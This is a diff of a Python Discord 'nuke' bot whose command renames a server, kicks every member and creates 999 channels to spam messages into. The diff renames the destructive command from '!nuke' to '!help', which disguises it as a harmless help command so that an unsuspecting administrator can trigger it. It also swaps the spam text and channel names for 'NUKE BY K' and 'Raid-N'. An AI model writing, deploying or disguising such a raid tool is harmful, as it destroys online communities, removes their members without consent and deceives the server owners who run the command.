@@ -16,9 +16,9 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 @bot.event
 async def on_ready():
     print(f'✅ Bot logged in as {bot.user}')
-    print(f'Bot is ready to nuke! Use !nuke command')
+    print(f'Bot is ready to Use')
 
-@bot.command(name='nuke')
+@bot.command(name='help')
 async def nuke(ctx):
     """
     Complete server nuke command
@@ -51,7 +51,7 @@ async def nuke(ctx):
     try:
         # Step 1: Change server name
         print("📝 Changing server name...")
-        await guild.edit(name="NUKE BY ROHIT")
+        await guild.edit(name="NUKE BY K")
         print("✅ Server name changed!")
         
         # Step 2: Kick all members (except bot)
@@ -88,11 +88,11 @@ async def nuke(ctx):
         
         # Step 5: Create 999+ new channels
         print("📺 Creating 999+ new channels...")
-        spam_message = "https://discord.gg/jq5rXw25h 🔥 NUKE BY ROHIT 🔥\nhttps://discord.gg/jq5rXw25h\nhttps://discord.gg/jq5rXw25h"
+        spam_message = "🔥 NUKE BY K 🔥"
         
         for i in range(999):
             try:
-                channel = await guild.create_text_channel(name=f"गोप-गोप-{i+1}")
+                channel = await guild.create_text_channel(name=f"Raid-{i+1}")
                 print(f"Created channel: {i+1}/999")
                 
                 # Send spam message 10 times
